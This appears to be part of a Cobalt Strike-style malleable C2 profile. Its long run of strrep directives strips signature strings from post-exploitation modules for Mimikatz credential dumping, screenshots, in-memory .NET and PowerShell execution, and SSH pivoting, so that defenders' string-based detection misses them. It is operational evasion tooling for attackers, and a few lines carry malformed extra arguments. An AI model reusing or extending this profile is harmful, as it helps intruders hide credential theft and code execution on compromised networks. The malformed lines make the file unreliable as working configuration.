        strrep "Mimikatz" " .## ^ ##. 'A La Vie, A L'Amour' - (oe.eo)" "";
        strrep "Mimikatz" " ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )" "";
        strrep "Mimikatz" " ## \\ / ## > https://blog.gentilkiwi.com/mimikatz" "";
        strrep "Mimikatz" " '# ## v ##' > Vincent LE TOUX ( vincent.letoux@gmail.com )" "";
        strrep "Mimikatz" " 'mimikatz(powershell) # pingcastle.com / https://mysmartlogon.com ***/" "";
        strrep "Mimikatz" "token::elevate" "";
        strrep "Mimikatz" "ERROR kull_m_string_displaySID ; ConvertSidToStringSid (" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_drsr_findAttrType ; Unable to get an ATTRTYP for" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_drsr_MakeAddPrefixToTable" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_drsr_free_DRS_MSG ; kull_m_rpc_drsr_free_DRS_MSG_GETCHGREPLY_data ; dwOutVersion not valid" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_drsr_free_DRS_MSG_DCINFOREPLY_data ; TODO (maybe?)" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_drsr_free_DRS_MSG_DCINFOREPLY_data ; dwOutVersion not valid (" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_drsr_free_DRS_MSG_DCINFOFOREPLY_data ; TODO (maybe?)" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_drsr_free_DRS_MSG_GETCHGREPLY_data ; No Session Key" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_drsr_CreateGetNCChangesReply_encrypt ; No valid data" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_drsr_CreateGetNCChangesReply_encrypt ; Unable to calculate CRC32" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_drsr_ProcessGetNCChangesReply_decrypt ; No Session Key" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_drsr_ProcessGetNCChangesReply_decrypt ; RtlDecryptData2" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_drsr_ProcessGetNCChangesReply_decrypt ; No valid data" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_drsr_ProcessGetNCChangesReply_decrypt ; Unable to calculate CRC32" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_drsr_ProcessGetNCChangesReply_decrypt ; Checksums don't match (C:" "";
        strrep "Mimikatz" " - R:" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_drsr_ProcessGetNCChangesReply ; Unable to MakeAttid for" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_drsr_CrackName ; RPC Exception 0x" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_drsr_CrackName ; CrackNames:" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_drsr_CrackName ; CrackNames: bad version" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_drsr_CrackName ; CrackNames: no item!" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_drsr_CrackName ; CrackNames (name status): 0x" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_drsr_getDCBind ; RPC Exception 0x" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_drsr_getDCBind ; IDL_DRSBind:" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_drsr_getDCBind ; No DRS Extensions Output" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_drsr_getDCBind ; Incorrect DRS Extensions Output Size (" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_drsr_getDCBind ; Incorrect DRS Extensions Output (" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_drsr_getDomainAndUserInfos ; RPC Exception 0x" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_drsr_getDomainAndUserInfos ; DomainControllerInfo: 0x" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_drsr_getDomainAndUserInfos ; DomainControllerInfo: bad version (" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_drsr_getDomainAndUserInfos ; DomainControllerInfo: DC" "";
        strrep "Mimikatz" "not found" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_drsr_RpcSecurityCallback ; I_RpcBindingInqSecurityContext" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_drsr_RpcSecurityCallback ; QueryContextAttributes" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_Generic_Encode ; MesEncodeIncrementalHandleCreate:" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_Generic_Encode ; MesIncrementalHandleReset:" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_Generic_Encode ; RPC Exception: 0x" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_Generic_Free ; MesDecodeIncrementalHandleCreate:" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_Generic_Decode ; MesIncrementalHandleReset:" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_Generic_Decode ; RPC Exception: 0x" "";
        strrep "Mimikatz" "[rpc] Password :" "rpc pwd";
        strrep "Mimikatz" "[rpc] Domain :" "";
        strrep "Mimikatz" "[rpc] Username :" "";
        strrep "Mimikatz" "[rpc] AuthnSvc :" "";
        strrep "Mimikatz" "[rpc] Service :" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_createBinding ; RpcStringBindingCompose: 0x" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_createBinding ; RpcBindingFromStringBinding: 0x" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_createBinding ; No Binding!" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_createBinding ; RpcBindingFree: 0x" "";
        strrep "Mimikatz" "ERROR kull_m_rpc_createBinding ; RpcBindingSetAuthInfoEx: 0x" "";
        strrep "Mimikatz" "Cannot add Service to NetworkAddr if NULL" "";
        strrep "Mimikatz" "Active mode" "";
        strrep "Mimikatz" "Erreur LocalAlloc:" "";
        strrep "Mimikatz" "ERROR kull_m_net_getDC ; DsGetDcName:" "";
        strrep "Mimikatz" "ERROR kull_m_ldap_getRootDomainNamingContext ; ldap_search_s 0x" "";
        strrep "Mimikatz" "ERROR kull_m_ldap_getRootDomainNamingContext ; ldap_count_entries is NOT 1" "";
        strrep "Mimikatz" "ERROR kull_m_ldap_getRootDomainNamingContext ; ldap_get_values_len is NOT 1" "";
        strrep "Mimikatz" "ERROR kull_m_ldap_getLdapAndRootDN ; ldap_init" "";
        strrep "Mimikatz" "ERROR kull_m_ldap_getLdapAndRootDN ; ldap_bind_s 0x" "";
        strrep "Mimikatz" "ERROR kull_m_kernel_ioctl_handle ; DeviceIoControl (0x" "";
        strrep "Mimikatz" "Base64 of file :" "";
        strrep "Mimikatz" "ERROR SkpEncryptionWorker ; Skp Crypto without CNG?" "";
        strrep "Mimikatz" "ERROR SkpEncryptionWorker ; SkpInitSymmetricEncryption: 0x" "";
        strrep "Mimikatz" "ERROR SkpEncryptionWorker ; SkpDeriveSymmetricKey: 0x" "";
        strrep "Mimikatz" "ERROR SkpEncryptionWorker ; BCryptGenerateSymmetricKey: 0x" "";
        strrep "Mimikatz" "ERROR SkpInitSymmetricEncryption ; SkpOpenAesGcmProvider: 0x" "";
        strrep "Mimikatz" "ERROR SkpInitSymmetricEncryption ; SkpOpenKdfProvider: 0x" "";
        strrep "Mimikatz" "ERROR SkpInitSymmetricEncryption ; SkpImportMasterKeyInKdf: 0x" "";
        strrep "Mimikatz" "ERROR SkpOpenKdfProvider ; BCryptOpenAlgorithmProvider: 0x" "";
        strrep "Mimikatz" "ERROR SkpOpenKdfProvider ; BCryptGetProperty: 0x" "";
        strrep "Mimikatz" "ERROR SkpOpenAesGcmProvider ; BCryptSetProperty: 0x" "";
        strrep "Mimikatz" "ERROR kull_m_crypto_NCryptFreeHandle ; NCryptFreeObject(prov): 0x" "";
        strrep "Mimikatz" "ERROR kull_m_crypto_NCryptFreeHandle ; No NCrypt support this function" "";
        strrep "Mimikatz" "ERROR kull_m_crypto_NCryptFreeHandle ; NCryptFreeObject(key): 0x" "";
        strrep "Mimikatz" "ERROR kull_m_crypto_NCryptGetProperty ; NCryptGetProperty(%s) - init: 0x" "";
        strrep "Mimikatz" "ERROR kull_m_crypto_NCryptGetProperty ; NCryptGetProperty(%s) - data: 0x" "";
        strrep "Mimikatz" "ERROR kull_m_crypto_NCryptGetProperty ; NCryptGetProperty(%s) - simple NCrypt_HANDLE: 0x" "";
        strrep "Mimikatz" "ERROR kull_m_crypto_NCryptAndKeyInfoToPfx ; CertAddEncodedCertificateToStore(DWORD): 0x" "";
        strrep "Mimikatz" "ERROR kull_m_crypto_DerAndKeyInfoToPfx ; CertSetCertificateContextProperty(CERT_KEY_PROV_INFO_PROP_ID) (0x" "";
        strrep "Mimikatz" "ERROR kull_m_crypto_DerAndKeyToPfx ; CryptAcquireContext (0x" "";
        strrep "Mimikatz" "ERROR kull_m_crypto_DerAndKeyToPfx ; CryptImportKey (0x" "";
        strrep "Mimikatz" "ERROR kull_m_crypto_exportPfx ; PFXExportCertStoreEx/kull_m_file_writeData (0x" "";
        strrep "Mimikatz" "ERROR kull_m_asn1_init_close ; ASN1prov->delete_container" "";
        strrep "Mimikatz" "ERROR kull_m_asn1_init ; ASN1_CreateDecoder:" "";
        strrep "Mimikatz" "ERROR kull_m_asn1_init ; ASN1_CreateEncoder:" "";
        strrep "Mimikatz" "ERROR kull_m_asn1_init ; ASN1_CreateModule" "";
        
        # Screenshot replacements
        strrep "Screenshot" "Quantization table 0x" "";
        strrep "Screenshot" "Not a JPEG file: starts with" "";
        strrep "Screenshot" "Insufficient memory (case" "";
        strrep "Screenshot" "Cannot quantize more than" "";
        strrep "Screenshot" "color components" "";
        strrep "Screenshot" "Cannot quantize to fewer than" "";
        strrep "Screenshot" "Cannot quantize to more than" "";
        strrep "Screenshot" "Invalid JPEG file structure: two SOF markers" "";
        strrep "Screenshot" "Invalid JPEG file structure: missing SOS marker" "";
        strrep "Screenshot" "Unsupported JPEG process: SOF type 0x" "";
        strrep "Screenshot" "Invalid JPEG file structure: two SOI markers" "";
        strrep "Screenshot" "Invalid JPEG file structure: SOS before SOF" "";
        strrep "Screenshot" "Failed to create temporary file" "";
        strrep "Screenshot" "Read failed on temporary file" "";
        strrep "Screenshot" "Seek failed on temporary file" "";
        strrep "Screenshot" "Write failed on temporary file — out of disk space?" "";
        strrep "Screenshot" "Unsupported marker type 0x" "";
        strrep "Screenshot" "Virtual array controller messed up" "";
        strrep "Screenshot" "Image too wide for this implementation" "";
        strrep "Screenshot" "Read from XMS failed" "";
        strrep "Screenshot" "Write to XMS failed" "";
        strrep "Screenshot" "Copyright (C) 2010, Thomas G. Lane, Guido Vollbeding" "";
        strrep "Screenshot" "10-Jan-2010" "";
        strrep "Screenshot" "Caution: quantization tables are too coarse for baseline JPEG" "";
        strrep "Screenshot" "Adobe APP14 marker: version %d, flags 0x" "";
        strrep "Screenshot" ", transform" "";
        strrep "Screenshot" "Unknown APP0 marker (not JFIF), length" "";
        strrep "Screenshot" "Unknown APP14 marker (not Adobe), length" "";
        strrep "Screenshot" "Define quantization table" "";
        strrep "Screenshot" "precision" "";
        strrep "Screenshot" "Define Restart Interval" "";
        strrep "Screenshot" "Freed EMS handle" "";
        strrep "Screenshot" "Obtained EMS handle" "";
        strrep "Screenshot" "End Of Image" "";
        strrep "Screenshot" "JFIF APP0 marker: version" "";
        strrep "Screenshot" "density" "";
        strrep "Screenshot" "Warning: thumbnail image size does not match data length" "";
        strrep "Screenshot" "JFIF extension image marker: type 0x" "";
        strrep "Screenshot" "thumbnail image" "";
        strrep "Screenshot" "Miscellaneous marker" "";
        strrep "Screenshot" "Unexpected marker" "";
        strrep "Screenshot" "Quantizing to" "";
        strrep "Screenshot" "Selected" "";
        strrep "Screenshot" "colors for quantization" "";
        strrep "Screenshot" "At marker" "";
        strrep "Screenshot" ", recovery action" "";
        strrep "Screenshot" "Invalid SOS parameters for sequential JPEG" "";
        strrep "Screenshot" "Smoothing not supported with nonstandard sampling ratios" "";
        strrep "Screenshot" "width=" "";
        strrep "Screenshot" ", height=" "";
        strrep "Screenshot" "components=" "";
        strrep "Screenshot" "Component " "";
        strrep "Screenshot" "Start of Image" "";
        strrep "Screenshot" "Start Of Scan:" "";
        strrep "Screenshot" "components" "";
        strrep "Screenshot" "dc=" "";
        strrep "Screenshot" "ac=" "";
        strrep "Screenshot" "Ss=" "";
        strrep "Screenshot" "Se=" "";
        strrep "Screenshot" "Ah=" "";
        strrep "Screenshot" "Al=" "";
        strrep "Screenshot" "Closed temporary file" "";
        strrep "Screenshot" "Opened temporary file" "";
        strrep "Screenshot" "JFIF extension marker: JPEG-compressed thumbnail image, length" "";
        strrep "Screenshot" "JFIF extension marker: palette thumbnail image, length" "";
        strrep "Screenshot" "JFIF unrecognized component marker: RGB thumbnail image, length" "";
        strrep "Screenshot" ", assuming YCbCr" "";
        strrep "Screenshot" "Freed XMS handle" "";
        strrep "Screenshot" "Obtained XMS handle" "";
        strrep "Screenshot" "Unknown Adobe color transform code" "";
        strrep "Screenshot" "Corrupt JPEG data: bad arithmetic code" "";
        strrep "Screenshot" "Inconsistent progression sequence for component" "";
        strrep "Screenshot" "Corrupt JPEG data:" "";
        strrep "Screenshot" "extraneous bytes before marker 0x" "";
        strrep "Screenshot" "Corrupt JPEG data: premature end of data segment" "";
        strrep "Screenshot" "Corrupt JPEG data: bad Huffman code" "";
        strrep "Screenshot" "Warning: unknown end of JFIF revision number" "";
        strrep "Screenshot" "Premature end of JPEG file" "";
        strrep "Screenshot" "Corrupt JPEG data: found marker" "";
        strrep "Screenshot" "instead of RST" "";
        strrep "Screenshot" "Bogus application transferred too many scanlines" "";
        strrep "Screenshot" "Bogus message code" "";
        strrep "Screenshot" "ALIGN_TYPE is wrong, please fix" "";
        strrep "Screenshot" "MAX_ALLOC_CHUNK is wrong, please fix" "";
        strrep "Screenshot" "Bogus buffer control mode" "";
        strrep "Screenshot" "Invalid component ID" "";
        strrep "Screenshot" "in SOS" "";
        strrep "Screenshot" "Invalid crop request" "";
        strrep "Screenshot" "DCT coefficient out of range" "";
        strrep "Screenshot" "DCT scaled block size" "range" "";
        strrep "Screenshot" "not supported" "";
        strrep "Screenshot" "Component index" "";
        strrep "Screenshot" "mismatching Huffman sampling ratio" "";
        strrep "Screenshot" "Bogus Huffman table definition" "";
        strrep "Screenshot" "Bogus input colorspace" "";
        strrep "Screenshot" "Bogus JPEG colorspace" "";
        strrep "Screenshot" "Bogus JPEG marker length" "";
        strrep "Screenshot" "Wrong JPEG library version: library is" "";
        strrep "Screenshot" "caller expects" "";
        strrep "Screenshot" "Sampling factors too large for interleaved scan" "";
        strrep "Screenshot" "Invalid memory JPEG pool code" "";
        strrep "Screenshot" "Unsupported precision" "";
        strrep "Screenshot" "Invalid progressive JPEG parameters" "";
        strrep "Screenshot" "Invalid progressive parameters at scan script entry" "";
        strrep "Screenshot" "Bogus sampling factors" "";
        strrep "Screenshot" "Invalid scan script at entry" "";
        strrep "Screenshot" "Improper call to JPEG library in state" "";
        strrep "Screenshot" "JPEG parameter struct mismatch: library thinks size is" "";
        strrep "Screenshot" ", caller expects" "";
        strrep "Screenshot" "Bogus caller virtual expects array access" "";
        strrep "Screenshot" "Buffer passed to JPEG library is too small" "";
        strrep "Screenshot" "Suspension not allowed here" "";
        strrep "Screenshot" "CCIR601 sampling not implemented yet" "";
        strrep "Screenshot" "Too many" "";
        strrep "Screenshot" "color components" ": " "";
        strrep "Screenshot" ", max" "";
        strrep "Screenshot" "Unsupported color conversion request" "";
        strrep "Screenshot" "Bogus DAC index" "";
        strrep "Screenshot" "Bogus DAC value value" "";
        strrep "Screenshot" "Bogus DHT index" "";
        strrep "Screenshot" "Bogus DQT index" "";
        strrep "Screenshot" "Empty JPEG image (DNL not supported)" "";
        strrep "Screenshot" "Read from EMS failed" "";
        strrep "Screenshot" "Write to EMS failed" "";
        strrep "Screenshot" "Didn't expect more than one scan" "";
        strrep "Screenshot" "Input file read error" "";
        strrep "Screenshot" "Output file write error — out of disk space?" "";
        strrep "Screenshot" "Fractional code sampling not implemented yet" "";
        strrep "Screenshot" "Huffman size table overflow" "";
        strrep "Screenshot" "Missing Huffman code table entry" "";
        strrep "Screenshot" "Maximum supported image dimension is" "";
        strrep "Screenshot" " pixels" "";
        strrep "Screenshot" "Empty input file" "";
        strrep "Screenshot" "Premature end of input file" "";
        strrep "Screenshot" "Cannot transcode due to multiple use of quantization table" "";
        strrep "Screenshot" "Scan script does not transmit all data" "";
        strrep "Screenshot" "Invalid color quantization mode change" "";
        strrep "Screenshot" "Not implemented yet" "";
        strrep "Screenshot" "Requested feature was omitted at compile time" "";
        strrep "Screenshot" "Arithmetic table 0x" "";
        strrep "Screenshot" "was not defined" "";
        strrep "Screenshot" "Backing store not supported" "";
        strrep "Screenshot" "Huffman" "";
        strrep "Screenshot" "JPEG datastream contains no image" "";
        
        # ExecuteAssembly
        strrep "ExecuteAssembly" "ICLRMetaHost::GetRuntime" "";
        strrep "ExecuteAssembly" "failed w/hr 0x" "";
        strrep "ExecuteAssembly" ".NET runtime [ver" "";
        strrep "ExecuteAssembly" "] cannot be loaded" "";
        strrep "ExecuteAssembly" "[-] No .NET runtime found. :(" "";
        strrep "ExecuteAssembly" "[-] getEntryPoint failed." "";
        strrep "ExecuteAssembly" "[+] getEntryPoint failed." "";
        strrep "ExecuteAssembly" "[-] Invoke_3 on EntryPoint failed." "";
        strrep "ExecuteAssembly" "[-] Failed to create the runtime host" "";
        strrep "ExecuteAssembly" "[-] ICorRuntimeHost::GetDefaultDomain failed w/hr 0x" "";
        strrep "ExecuteAssembly" "[-] Failed to get default AppDomain w/hr 0x" "";
        strrep "ExecuteAssembly" "Could not find signature in the" "";
        strrep "ExecuteAssembly" "Could not fix signature in the" "";
        strrep "ExecuteAssembly" "function :" "";
        strrep "ExecuteAssembly" "[-] Patch index" "";
        strrep "ExecuteAssembly" " error setting memory protection" "";
        strrep "ExecuteAssembly" "loading" "";
        strrep "ExecuteAssembly" "getting library address for:" "";
        strrep "ExecuteAssembly" "getting proc address for:" "";
        strrep "ExecuteAssembly" "error re-setting memory protection" "";
        strrep "ExecuteAssembly" "bad exception" "";
        
        # PowerPick
        strrep "PowerPick" "Could not find signature in the" "";
        strrep "PowerPick" "Could not fix signature in the" "";
        strrep "PowerPick" "function:" "";
        strrep "PowerPick" "[-] Patch index" "";
        strrep "PowerPick" " error setting memory protection" "";
        strrep "PowerPick" "error re-setting memory protection" "";
        strrep "PowerPick" "loading library" "";
        strrep "PowerPick" "getting proc address:" "";
        strrep "PowerPick" "Could not find .NET 4.0 API CLRCreateInstance" "";
        strrep "PowerPick" "CLRCreateInstance failed w/hr 0x" "";
        strrep "PowerPick" "ICLRMetaHost::GetRuntime (v4.0.30319) failed w/hr 0x" "";
        strrep "PowerPick" ".NET runtime [ver" "";
        strrep "PowerPick" "] cannot be loaded" "";
        strrep "PowerPick" "ICLRRuntimeInfo::GetInterface failed w/hr 0x" "";
        strrep "PowerPick" "Could not find API CorBindToRuntime" "";
        strrep "PowerPick" "CorBindToRuntime failed w/hr 0x" "";
        strrep "PowerPick" "Did not understand ver:" "";
        strrep "PowerPick" "Failed to invoke IsAlive w/hr 0x" "";
        strrep "PowerPick" "SafeArrayPutElement failed w/hr 0x" "";
        strrep "PowerPick" "Failed to invoke InvokePS w/hr 0x" "";
        strrep "PowerPick" "Failed to create the runtime host" "";
        strrep "PowerPick" "CLR failed to start w/hr 0x" "";
        strrep "PowerPick" "RuntimeClrHost::GetCurrentAppDomainId failed w/hr 0x" "";
        strrep "PowerPick" "ICorRuntimeHost::GetDefaultDomain failed w/hr 0x" "";
        strrep "PowerPick" "Failed to get default AppDomain w/hr 0x" "";
        strrep "PowerPick" "Failed to load the assembly w/hr 0x" "";
        strrep "PowerPick" "Failed to get the Type interface w/hr 0x" "";
        strrep "PowerPick" "bad allocation" "";
        
        # SSHAgent
        strrep "SSHAgent" "Error allocating space for remote banner" "";
        strrep "SSHAgent" "Received Banner:" "";
        strrep "SSHAgent" "SSH-2.0-libssh2_1.8.0" "";
        strrep "SSHAgent" "Unable to allocate memory for local banner" "";
        strrep "SSHAgent" "API timeout expired" "";
        strrep "SSHAgent" "Timed out waiting on socket" "";
        strrep "SSHAgent" "Error waiting on socket" "";
        strrep "SSHAgent" "Bad socket provided" "";
        strrep "SSHAgent" "Failed changing socket's blocking state to non-blocking" "";
        strrep "SSHAgent" "Failed sending banner" "";
        strrep "SSHAgent" "Failed getting banner" "";
        strrep "SSHAgent" "Unable to exchange encryption keys" "";
        strrep "SSHAgent" "Unable to ask for ssh-userauth service" "";
        strrep "SSHAgent" "Invalid response received from server" "";
        strrep "SSHAgent" "Freeing session resource" "";
        strrep "SSHAgent" "Disconnecting: reason=" "";
        strrep "SSHAgent" "desc=" "";
        strrep "SSHAgent" " lang=" "";
        strrep "SSHAgent" "too long description" "";
        strrep "SSHAgent" "OFF" "";
        strrep "SSHAgent" "Setting blocking mode" "";
        strrep "SSHAgent" "Unable to allocate space for channel data" "";
        strrep "SSHAgent" "Failed allocating space for channel type name" "";
        strrep "SSHAgent" "Unable to allocate temporary space for packet" "";
        strrep "SSHAgent" "Would block sending channel-open request" "";
        strrep "SSHAgent" "Unable to send channel-open request" "";
        strrep "SSHAgent" "Channel open failure (administratively prohibited)" "";
        strrep "SSHAgent" "Channel open failure (connect failed)" "";
        strrep "SSHAgent" "Channel open failure (unknown channel type)" "";
        strrep "SSHAgent" "Channel open failure (resource shortage)" "";
        strrep "SSHAgent" "Channel open failure" "";
        strrep "SSHAgent" "Requesting direct-tcpip session to from" "";
        strrep "SSHAgent" "Unable to allocate memory for direct-tcpip connection" "";
        strrep "SSHAgent" "Would block sending global-request packet for forward listen request" "";
        strrep "SSHAgent" "Requesting tcpip-forward session for" "";
        strrep "SSHAgent" "Unable to allocate memory for setenv packet" "";
        strrep "SSHAgent" "Unable to send global-request packet for forward listen request" "";
        strrep "SSHAgent" "Unable to allocate complete memory for listener queue" "";
        strrep "SSHAgent" "Unable to forward-listen" "";
        strrep "SSHAgent" "Cancelling complete tcpip-forward request session for forward for" "";
        strrep "SSHAgent" "Would block sending forward request" "";
        strrep "SSHAgent" "Would block waiting for packet" "";
        strrep "SSHAgent" "Channel not found" "";
        strrep "SSHAgent" "Channel can not be reused" "";
        strrep "SSHAgent" "starting request" "";
        strrep "SSHAgent" "on channel" "";
        strrep "SSHAgent" " message=" "";
        strrep "SSHAgent" "Unable to allocate memory for channel-process request" "";
        strrep "SSHAgent" "Would block sending channel request" "";
        strrep "SSHAgent" "Unable to send channel request" "";
        strrep "SSHAgent" "Failed waiting for channel success" "";
        strrep "SSHAgent" "Unable to complete request for channel-process-startup" "";
        strrep "SSHAgent" "transport_read" "";
        strrep "SSHAgent" "of channel_data() got" "";
        strrep "SSHAgent" "of data from" "";
        strrep "SSHAgent" "would block" "";
        strrep "SSHAgent" "We've already closed this channel" "";
        strrep "SSHAgent" "EOF has already been received, data might be ignored" "";
        strrep "SSHAgent" "Failure while draining incoming flow" "";
        strrep "SSHAgent" "Unable to send channel EOF data" "";
        strrep "SSHAgent" "Would block sending EOF on channel" "";
        strrep "SSHAgent" "_libssh2_transport_read() bailed out!" "";
        strrep "SSHAgent" "Unable to send EOF, but closing channel anyway" "";
        strrep "SSHAgent" "Would block sending close-channel" "";
        strrep "SSHAgent" "Unable to send close-channel request, but closing anyway" "";
        strrep "SSHAgent" "libssh2_channel_wait_closed() invoked when channel is not in EOF state" "";
        strrep "SSHAgent" "Unable to allocate a command buffer for SCP session" "";
        strrep "SSHAgent" "scp" "";
        strrep "SSHAgent" "Would block starting up channel" "";
        strrep "SSHAgent" "Would block requesting SCP startup" "";
        strrep "SSHAgent" "Would block sending initial wakeup" "";
        strrep "SSHAgent" "Would block waiting for SCP response" "";
        strrep "SSHAgent" "Failed reading SCP response" "";
        strrep "SSHAgent" "Failed to get memory" "";
        strrep "SSHAgent" "got " "";
        strrep "SSHAgent" "Failed to recv file" "";
        strrep "SSHAgent" "Invalid data in SCP response" "";
        strrep "SSHAgent" "Unterminated response from SCP server" "";
        strrep "SSHAgent" "Invalid response from SCP server, too short" "";
        strrep "SSHAgent" "Invalid response from SCP server, malformed mtime.usec" "";
        strrep "SSHAgent" "Invalid response from SCP server, malformed mtime" "";
        strrep "SSHAgent" "Invalid response from SCP server, too short mtime" "";
        strrep "SSHAgent" "Would block waiting to send SCP ACK" "";
        strrep "SSHAgent" "Invalid response from SCP server, malformed mode" "";
        strrep "SSHAgent" "Invalid response from SCP server, invalid mode" "";
        strrep "SSHAgent" "Invalid response from SCP server, invalid size" "";
        strrep "SSHAgent" "Invalid response from SCP server" "";
        strrep "SSHAgent" "Would block sending SCP ACK" "";
        strrep "SSHAgent" "Unexpected error channel while close" "";
        strrep "SSHAgent" "Unknown error string" "";
        strrep "SSHAgent" "Would block waiting getting error from remote" ""; 
        strrep "SSHAgent" "SCP failure" "";
        strrep "SSHAgent" "Invalid ACK response from remote" "";
        strrep "SSHAgent" "Sent " "";
        strrep "SSHAgent" "Would block sending time data for SCP file" "";
        strrep "SSHAgent" "Unable to send core file data for SCP file" "";
        strrep "SSHAgent" "Would block waiting for response" "";
        strrep "SSHAgent" "Invalid SCP ACK response" "";
        strrep "SSHAgent" "Would block send core file data for SCP file" "";
        strrep "SSHAgent" "failed to get memory" "";
        strrep "SSHAgent" "failed to send file" "";
        strrep "SSHAgent" "Unable to allocate memory for userauth_list" "";
        strrep "SSHAgent" "Would block requesting userauth list" "";
        strrep "SSHAgent" "Unable to send userauth-none request" "";
        strrep "SSHAgent" "Failed getting response" "";
        strrep "SSHAgent" "No error" "";
        strrep "SSHAgent" "Permitted auth methods:" "";
        strrep "SSHAgent" "Unable to allocate memory for userauth-password request" "";
        strrep "SSHAgent" "Would block writing password request" "";
        strrep "SSHAgent" "Unable to send userauth-password request" "";
        strrep "SSHAgent" "Unable to allocate memory for userauth password change request" "";
        strrep "SSHAgent" "Would block waiting" "";
        strrep "SSHAgent" "Unable to send userauth password-change request" "";
        strrep "SSHAgent" "Password Expired, and no callback specified" "";
        strrep "SSHAgent" "Authentication Expired failed" "";
        strrep "SSHAgent" "Invalid data in public key file" "";
        strrep "SSHAgent" "Unable to allocate memory for public key data" "";
        strrep "SSHAgent" "Missing public key data" "";
        strrep "SSHAgent" "Invalid public key data" "";
        strrep "SSHAgent" "Invalid key data, not base64 encoded" "";
        strrep "SSHAgent" "No handler for specified private key" "";
        strrep "SSHAgent" "Unable to initialize private key" "";
        strrep "SSHAgent" "Out of memory" "";
        strrep "SSHAgent" "Invalid signature for supplied public key, or bad username/public key combination" "";
        strrep "SSHAgent" "Invalid public key, too short" "";
        strrep "SSHAgent" "Invalid public key" "";
        strrep "SSHAgent" "Unable to send userauth-publickey request" "";
        strrep "SSHAgent" "Waiting for USERAUTH response" "";
        strrep "SSHAgent" "Username/PublicKey combination invalid" "";
        strrep "SSHAgent" "Unable to allocate memory for userauth-publickey signed data" "";
        strrep "SSHAgent" "Callback returned error" "";
        strrep "SSHAgent" "Failed allocating additional space for userauth-publickey packet" "";
        strrep "SSHAgent" "Waiting for publickey USERAUTH response" "";
        strrep "SSHAgent" "Unable to extract public key and private key from private key." "";
        strrep "SSHAgent" "Invalid data in public and private key." "";
        strrep "SSHAgent" "Unable to allocate memory for private keyboard-interactive authentication" "";
        strrep "SSHAgent" "Unable to send keyboard-interactive request" "";
        strrep "SSHAgent" "Waiting for keyboard-interactive USERAUTH response" "";
        strrep "SSHAgent" "Authentication failed (keyboard-interactive)" "";
        strrep "SSHAgent" "Unable to allocate memory for keyboard-interactive 'name' request field" "";
        strrep "SSHAgent" "Unable to allocate memory for keyboard-interactive 'instruction' request field" "";
        strrep "SSHAgent" "Unable to allocate memory for keyboard-interactive prompts array" "";
        strrep "SSHAgent" "Unable to allocate memory for keyboard-interactive responses array" "";
        strrep "SSHAgent" "Unable to allocate memory for keyboard-interactive prompt message" "";
        strrep "SSHAgent" "Unable to allocate buffer for SHA digest" "";
        strrep "SSHAgent" "Unable to send Group Exchange Request" "";
        strrep "SSHAgent" "Timeout waiting for GEX_GROUP reply" "";
        strrep "SSHAgent" "Unable to send Group Exchange Request SHA256" "";
        strrep "SSHAgent" "Timeout waiting for GEX_GROUP reply SHA256" "";
        strrep "SSHAgent" "Unable to allocate memory" "";
        strrep "SSHAgent" "Unable to send KEXINIT packet to remote host" "";
        strrep "SSHAgent" "Agreed on KEX method:" "";
        strrep "SSHAgent" "Agreed on HOSTKEY method:" "";
        strrep "SSHAgent" "Agreed on CRYPT_CS method:" "";
        strrep "SSHAgent" "Agreed on MAC_CS method:" "";
        strrep "SSHAgent" "Agreed on MAC_SC method:" "";
        strrep "SSHAgent" "Agreed on COMP_CS method:" "";
        strrep "SSHAgent" "Agreed on COMP_SC method:" "";
        strrep "SSHAgent" "Unrecoverable error exchanging keys" "";
        strrep "SSHAgent" "Remote received connection from" "";
        strrep "SSHAgent" "Unable to allocate a channel for new connection" "";
        strrep "SSHAgent" "Forward not requested" "";
        strrep "SSHAgent" "Unable to send open failure" "";
        strrep "SSHAgent" "X11 Connection Received from" "";
        strrep "SSHAgent" "on channel" "";
        strrep "SSHAgent" "allocate a channel for new connection" "";
        strrep "SSHAgent" "X11 Forward Unavailable" "";
        strrep "SSHAgent" "Invalid MAC received" "";
        strrep "SSHAgent" "Disconnect()" "";
        strrep "SSHAgent" "memory for signal name" "";
        strrep "SSHAgent" "Debug Packet:" "";
        strrep "SSHAgent" "Received global request type" "";
        strrep "SSHAgent" "(wr " "";
        strrep "SSHAgent" "Packet received for unknown channel" "";
        strrep "SSHAgent" "Packet contains more data than we offered to receive, truncating" "";
